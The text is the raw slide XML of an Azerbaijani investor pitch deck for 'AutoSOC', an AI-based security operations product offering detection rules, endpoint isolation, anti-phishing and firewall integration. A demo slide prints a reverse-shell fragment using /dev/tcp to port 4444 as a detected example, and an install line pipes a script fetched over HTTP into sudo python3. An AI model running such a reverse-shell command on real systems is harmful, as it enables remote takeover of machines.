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AutoSOC — kiçik komandalar üçün tam təhlükəsizlik mərkəzi. Bir pəncərədə aşkarla, izah et, cavab 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Əsas ağrı: görünməzlik + ekspert çatışmazlığı + yavaş həllər. Nəticədə hücumlar aşkarlanmır.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Sİ + tənzimləmə təzyiqi + ənənəvi alətlərin bahalığı = indi düzgün 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 sütun: aşkarla, izah et, cavab ver — hamısı bir yerdə, ekspert olmadan.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Axın: topla → aşkarla → izah et → insident → cavab.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Aşkarlama mühərriki dəyər yaradan hissədir — hazır qaydalar + öz qaydaları.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bir əmrlə qoşulur; şübhəli hostu bir kliklə təcrid etmək mümkündür.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Anti-fişinq ayrıca dəyər — çox SIEM-də yoxdur.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Setevoi firewall inteqrasiyası: syslog + threat feed + FortiGate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aşkarla → izah et → qərar → təcrid. Canlı təcrid — ən güclü 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Fərq: sürət, ekspert tələb etməməsi, hazır qaydalar, cavab, daxili agent, çoxdillilik.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Ən sürətli kanal — MSSP; regional çoxdillilik üstünlük.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Freemium → Pro (son nöqtə) → MSSP/DC → əlavələr.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Wedge hazır; multi-tenancy və uyğunluq — enterprise gəlir açarı.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Çağırış: pilotlar və tərəfdaşlar. İlk 10 ödənişli müştəri hədəfi.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0E2540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023360"/>
            <a:ext cx="3840480" cy="3840480"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0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45920"/>
            <a:ext cx="1005840" cy="1005840"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="2B7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8973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600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AutoSOC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548640" y="2880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7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Süni intellektə əsaslanan kibertəhlükəsizlik əməliyyat mərkəzi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3657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pəncərədə:  aşkarla  ·  izah et  ·  cavab ver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Məhsul və investor təqdimatı</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="13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7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Şirkətlərin çoxunda təhlükəsizlik mərkəzi (SOC) yoxdur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453384" cy="2834640"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3548"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="121F30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" y="2322576"/>
            <a:ext cx="658368" cy="658368"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FF6B7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4871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2350008"/>
            <a:ext cx="2356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Görünmə yoxdur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941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Onlarla server işləyir, lakin hücumları görəcək vahid mərkəz yoxdur.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67784" y="2148840"/>
            <a:ext cx="3453384" cy="2834640"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3548"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="121F30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41520" y="2322576"/>
            <a:ext cx="658368" cy="658368"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FF9F6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112" y="24871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0472" y="2350008"/>
            <a:ext cx="2356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Ekspert yoxdur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623816" y="3108960"/>
            <a:ext cx="2941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sistemləri təlimli analitik tələb edir — bu, çoxunun ödəyə bilmədiyi maaşdır.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86928" y="2148840"/>
            <a:ext cx="3453384" cy="2834640"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3548"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="121F30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60664" y="2322576"/>
            <a:ext cx="658368" cy="658368"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFD36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256" y="24871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19616" y="2350008"/>
            <a:ext cx="2356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Çox yavaş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442960" y="3108960"/>
            <a:ext cx="2941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Korporativ alətlər həftələrlə qurulur, aylarla köklənir. Hücumlar isə gözləmir.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11579"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0C1826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5413248"/>
            <a:ext cx="548640" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FF6B7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55040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5394960"/>
            <a:ext cx="9994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Nəticə: hücum baş verir — və heç kim fərqinə varmır.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="17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7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NIYƏ INDI?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Bazar məhz indi bu həllə hazırdır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1091672" cy="1170432"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 8594"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="121F30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" y="2377440"/>
            <a:ext cx="713232" cy="713232"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="2B7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2555748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29514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Süni intellekt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783080" y="2752344"/>
            <a:ext cx="9537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dəfə təhlükəni sadə, insan dilində izah etmək mümkün oldu — analitik olmadan.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520440"/>
            <a:ext cx="11091672" cy="1170432"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 8594"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="121F30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32104" y="3749040"/>
            <a:ext cx="713232" cy="713232"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="5DD39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3927348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66674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Tənzimləmə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783080" y="4123944"/>
            <a:ext cx="9537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27001, PCI-DSS, GDPR və yerli tələblər kiçik biznesi hərəkətə məcbur edir.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4892040"/>
            <a:ext cx="11091672" cy="1170432"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 8594"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="121F30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2104" y="5120640"/>
            <a:ext cx="713232" cy="713232"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFD36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5298948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503834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Bahalıq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783080" y="5495544"/>
            <a:ext cx="9537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SIEM-lər kiçik komandalar üçün həm çox ağır, həm də çox bahadır.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="135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7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HƏLL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AutoSOC — sizə bələdçilik edən təhlükəsizlik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453384" cy="2743200"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3667"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="121F30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" y="2322576"/>
            <a:ext cx="658368" cy="658368"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="2B7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4871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2350008"/>
            <a:ext cx="2356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Aşkarla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941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Şəbəkə skanı + canlı loglar üzərində MITRE ATT&amp;CK-a bağlı 35+ hazır qayda.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67784" y="2148840"/>
            <a:ext cx="3453384" cy="2743200"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3667"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="121F30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41520" y="2322576"/>
            <a:ext cx="658368" cy="658368"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="B79C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112" y="24871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0472" y="2350008"/>
            <a:ext cx="2356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İzah et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623816" y="3108960"/>
            <a:ext cx="2941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Sİ köməkçi hər tapıntını sadə dildə izah edir — Azərbaycan, rus və ingilis dilində.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86928" y="2148840"/>
            <a:ext cx="3453384" cy="2743200"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3667"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="121F30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60664" y="2322576"/>
            <a:ext cx="658368" cy="658368"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="5DD39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256" y="24871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19616" y="2350008"/>
            <a:ext cx="2356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Cavab ver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442960" y="3108960"/>
            <a:ext cx="2941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kliklə: son nöqtəni şəbəkədən təcrid et, IP-ni host və FortiGate-də blokla.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2578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77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məhsul.  SOC komandası tələb olunmur.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="19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7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NECƏ IŞLƏYIR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 məlumatdan bir kliklə cavaba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1984248" cy="2011680"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5069"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="121F30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" y="2752344"/>
            <a:ext cx="749808" cy="749808"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="2B7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2939796"/>
            <a:ext cx="374904" cy="374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3504" y="35661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 / Skan et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03504" y="395020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Agentlər və syslog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514600" y="2926080"/>
            <a:ext cx="347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2825496" y="2468880"/>
            <a:ext cx="1984248" cy="2011680"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5069"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="121F30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42716" y="2752344"/>
            <a:ext cx="749808" cy="749808"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="B79C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2939796"/>
            <a:ext cx="374904" cy="3749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80360" y="35661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Aşkarla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2880360" y="395020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qaydaları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791456" y="2926080"/>
            <a:ext cx="347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2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5102352" y="2468880"/>
            <a:ext cx="1984248" cy="2011680"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5069"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="121F30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719572" y="2752344"/>
            <a:ext cx="749808" cy="749808"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="77BE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2939796"/>
            <a:ext cx="374904" cy="3749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57216" y="35661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Sİ izahı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5157216" y="395020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Sadə dildə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7068312" y="2926080"/>
            <a:ext cx="347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17"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7379208" y="2468880"/>
            <a:ext cx="1984248" cy="2011680"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5069"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="121F30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996428" y="2752344"/>
            <a:ext cx="749808" cy="749808"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFD36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2939796"/>
            <a:ext cx="374904" cy="37490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34072" y="35661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İnsident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7434072" y="395020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Triaj növbəsi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9345168" y="2926080"/>
            <a:ext cx="347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8" name="Shape 22"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9656064" y="2468880"/>
            <a:ext cx="1984248" cy="2011680"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5069"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="121F30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273284" y="2752344"/>
            <a:ext cx="749808" cy="749808"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="5DD39E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0736" y="2939796"/>
            <a:ext cx="374904" cy="37490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710928" y="35661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Cavab</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1450" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="32" name="Text 25"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9710928" y="395020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Təcrid / Blok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548640" y="4983480"/>
            <a:ext cx="11091672" cy="1051560"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 9565"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0C1826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795528" y="5202936"/>
            <a:ext cx="603504" cy="603504"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="2B7FFF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04" y="5353812"/>
            <a:ext cx="301752" cy="30175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554480" y="5120640"/>
            <a:ext cx="9811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Agentlər serverlərdən log, proses və şəbəkə məlumatını mərkəzə göndərir — bir əmrlə qoşularaq.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="145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7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MƏHSUL · 1/4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Aşkarlama mühərriki — SIEM-in özəyi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6400800" cy="3977640"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2529"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="121F30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33172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 SIEM-lərin sizi yazmağa məcbur etdiyi qaydalar — hazır gəlir.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41832" y="3017520"/>
            <a:ext cx="310896" cy="310896"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1F805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" y="3095244"/>
            <a:ext cx="155448" cy="155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953512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ATT&amp;CK-a bağlı 35+ standart qayda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41832" y="3584448"/>
            <a:ext cx="310896" cy="310896"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1F805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" y="3662172"/>
            <a:ext cx="155448" cy="1554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5204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Brute-force, reverse shell, credential dumping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941832" y="4151376"/>
            <a:ext cx="310896" cy="310896"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1F805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" y="4229100"/>
            <a:ext cx="155448" cy="1554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08736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Ransomware, C2 əlaqələri, backdoor portları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941832" y="4718304"/>
            <a:ext cx="310896" cy="310896"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1F805D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" y="4796028"/>
            <a:ext cx="155448" cy="1554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4654296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 qaydalarını əlavə et və ya sil (regex)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941832" y="5285232"/>
            <a:ext cx="310896" cy="310896"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1F805D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556" y="5362956"/>
            <a:ext cx="155448" cy="15544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17320" y="5221224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Sİ və IOC siyahısı ilə avtomatik korrelyasiya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7360920" y="2103120"/>
            <a:ext cx="4279392" cy="3977640"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2529"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0C1826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7589520" y="2377440"/>
            <a:ext cx="457200" cy="457200"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FF6B7A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3820" y="2491740"/>
            <a:ext cx="228600" cy="2286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183880" y="2395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QAYDA İŞƏ DÜŞDÜ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7635240" y="3063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shell aşkarlandı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7635240" y="345643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MITRE: T1059  ·  Kritik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7635240" y="39319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3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-i &gt;&amp; /dev/tcp/10.0.0.9/4444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7635240" y="443484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DD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İnsident açıldı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DD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Mənbə IP bloklandı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DD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Telegram-a bildiriş</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="13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7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MƏHSUL · 2/4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nöqtə agentləri və bir kliklə təcrid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349240" cy="1600200"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 6286"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="121F30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" y="2322576"/>
            <a:ext cx="658368" cy="658368"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="2B7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4871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2350008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əmrlə qoşulma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48371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İstənilən serverdə tək əmr — Python quraşdırmağa ehtiyac yoxdur.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886200"/>
            <a:ext cx="5349240" cy="1600200"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 6286"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="121F30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22376" y="4059936"/>
            <a:ext cx="658368" cy="658368"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="B79C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42245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81328" y="4087368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görünmə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804672" y="4846320"/>
            <a:ext cx="48371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Hostname, IP, proseslər və hansı prosesin hansı portu açdığı.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309360" y="2148840"/>
            <a:ext cx="5330952" cy="1600200"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 6286"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="121F30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83096" y="2322576"/>
            <a:ext cx="658368" cy="658368"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FF6B7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24871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42048" y="2350008"/>
            <a:ext cx="4233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Şəbəkədən təcrid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6565392" y="3108960"/>
            <a:ext cx="48188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Şübhəli hostu bir kliklə şəbəkədən ayır — yalnız AutoSOC ilə əlaqə qalır.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09360" y="3886200"/>
            <a:ext cx="5330952" cy="1600200"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 6286"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="121F30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83096" y="4059936"/>
            <a:ext cx="658368" cy="658368"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="5DD39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422452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42048" y="4087368"/>
            <a:ext cx="4233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Xarici port skanı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6565392" y="4846320"/>
            <a:ext cx="48188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Agentin bildirmədiyi, lakin xaricdən açıq portları aşkarla (gizli servis).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5715000"/>
            <a:ext cx="11091672" cy="685800"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 14667"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0C1826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" y="578815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7B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http://&lt;server&gt;:8787/agent | sudo python3 - --server http://&lt;server&gt;:8787 --token &lt;kod&gt;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="125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7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MƏHSUL · 3/4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Anti-fişinq və Sİ köməkçi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453384" cy="2743200"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3667"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="121F30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" y="2322576"/>
            <a:ext cx="658368" cy="658368"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FF9F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4871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2350008"/>
            <a:ext cx="2356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analizi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941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Struktur, TLS sertifikatı, səhifə məzmunu və homoqraf hiylələri.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67784" y="2148840"/>
            <a:ext cx="3453384" cy="2743200"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3667"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="121F30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41520" y="2322576"/>
            <a:ext cx="658368" cy="658368"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="5DD39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112" y="24871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0472" y="2350008"/>
            <a:ext cx="2356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Orfoqrafiya + Sİ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623816" y="3108960"/>
            <a:ext cx="2941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Mətndəki səhvləri və brend təqlidini aşkarla; Sİ vердикт verir.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86928" y="2148840"/>
            <a:ext cx="3453384" cy="2743200"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3667"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="121F30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60664" y="2322576"/>
            <a:ext cx="658368" cy="658368"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFD36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256" y="24871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19616" y="2350008"/>
            <a:ext cx="2356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bal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442960" y="3108960"/>
            <a:ext cx="2941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Aydın nəticə: Təhlükəsiz → Şübhəli → Təhlükəli. Bir kliklə insidentə çevir.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2578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77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Əksər SIEM-lərdə anti-fişinq ümumiyyətlə yoxdur — bizdə var.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="18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7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MƏHSUL · 4/4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FortiGate, Palo Alto, MikroTik ilə inteqrasiya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453384" cy="2743200"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3667"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="121F30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" y="2322576"/>
            <a:ext cx="658368" cy="658368"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="2B7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4871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2350008"/>
            <a:ext cx="2356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Syslog qəbulu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941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Cihazlar syslog göndərir — loglar mərkəzə düşür, brute-force aşkarlanır.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67784" y="2148840"/>
            <a:ext cx="3453384" cy="2743200"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3667"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="121F30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41520" y="2322576"/>
            <a:ext cx="658368" cy="658368"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="B79C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112" y="24871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0472" y="2350008"/>
            <a:ext cx="2356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 siyahısı feed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623816" y="3108960"/>
            <a:ext cx="2941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Cihaz /blocklist.txt URL-ni oxuyur və bloklu IP-ləri özü drope edir.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86928" y="2148840"/>
            <a:ext cx="3453384" cy="2743200"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3667"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="121F30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60664" y="2322576"/>
            <a:ext cx="658368" cy="658368"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="5DD39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256" y="24871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19616" y="2350008"/>
            <a:ext cx="2356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Birbaşa API blok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442960" y="3108960"/>
            <a:ext cx="2941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FortiGate REST API ilə IP-ni real vaxtda blokla.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11579"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0C1826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68680" y="5349240"/>
            <a:ext cx="104515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Hər blok eyni anda: yerli firewall + FortiGate + feed — müştəridə nə olursa olsun işləyir.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="15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7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saniyəlik canlı demo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2498598" cy="2103120"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4783"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="121F30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04747" y="2779776"/>
            <a:ext cx="786384" cy="786384"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FF6B7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1343" y="2976372"/>
            <a:ext cx="393192" cy="393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3504" y="3648456"/>
            <a:ext cx="23888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Aşkarla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3977640"/>
            <a:ext cx="23157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shell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3412998" y="2514600"/>
            <a:ext cx="2498598" cy="2103120"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4783"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="121F30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69105" y="2779776"/>
            <a:ext cx="786384" cy="786384"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="77BE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701" y="2976372"/>
            <a:ext cx="393192" cy="3931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67862" y="3648456"/>
            <a:ext cx="23888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İzah et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504438" y="3977640"/>
            <a:ext cx="23157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Sİ: “4444 portunda C2”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277356" y="2514600"/>
            <a:ext cx="2498598" cy="2103120"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4783"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="121F30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33463" y="2779776"/>
            <a:ext cx="786384" cy="786384"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFD36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0059" y="2976372"/>
            <a:ext cx="393192" cy="3931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32220" y="3648456"/>
            <a:ext cx="23888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Qərar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368796" y="3977640"/>
            <a:ext cx="23157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İnsident açıldı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9141714" y="2514600"/>
            <a:ext cx="2498598" cy="2103120"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4783"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="121F30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997821" y="2779776"/>
            <a:ext cx="786384" cy="786384"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="5DD39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4417" y="2976372"/>
            <a:ext cx="393192" cy="3931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96578" y="3648456"/>
            <a:ext cx="23888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Cavab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233154" y="3977640"/>
            <a:ext cx="23157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TƏCRİD EDİLDİ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548640" y="52120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77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serverin şəbəkədən ayrılması — məhz bu, satışı bağlayan andır.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="17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7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FƏRQIMIZ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Bu, növbəti SIEM deyil. Sadəcə skaner də deyil.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468880"/>
                <a:gridCol w="3108960"/>
                <a:gridCol w="2587752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8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3A9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8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3A9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SIEM (Splunk…)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8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7B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AutoSOC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82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4F8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Quraşdırma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3A9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saniyələr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3A9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həftələr–aylar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DD3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dəqiqələr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1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4F8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Ekspert tələbi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3A9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3A9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(əsas xərc)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DD3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yox — Sİ izah edir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1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4F8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Hazır qaydalar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8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3A9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özün yazırsan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DD3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35+ hazır + öz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1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4F8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Cavab / təcrid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8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3A9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məhdud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DD3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 kliklə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1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4F8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 nöqtə agenti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8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3A9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ayrı məhsul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DD3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daxili, 1 əmr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1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4F8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Dillər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3A9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3A9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DD3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 / RU / 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711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="http://schemas.openxmlformats.org/presentationml/2006/main"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7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ödəyir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453384" cy="2377440"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4231"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="121F30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" y="2276856"/>
            <a:ext cx="658368" cy="658368"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="2B7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4414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2304288"/>
            <a:ext cx="2356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Kiçik biznes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04672" y="3063240"/>
            <a:ext cx="2941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Təhlükəsizlik komandası yoxdur — AutoSOC izləyir və Telegram-a bildirir.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67784" y="2103120"/>
            <a:ext cx="3453384" cy="2377440"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4231"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="121F30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41520" y="2276856"/>
            <a:ext cx="658368" cy="658368"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="B79C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112" y="244144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0472" y="2304288"/>
            <a:ext cx="2356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MSSP və data-mərkəzlər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623816" y="3063240"/>
            <a:ext cx="2941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Çoxlu server/tenant; mərkəzi toplama + bir kliklə təcrid.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86928" y="2103120"/>
            <a:ext cx="3453384" cy="2377440"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4231"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="121F30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60664" y="2276856"/>
            <a:ext cx="658368" cy="658368"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="5DD39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256" y="244144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19616" y="2304288"/>
            <a:ext cx="2356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Uyğunluq alıcıları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442960" y="3063240"/>
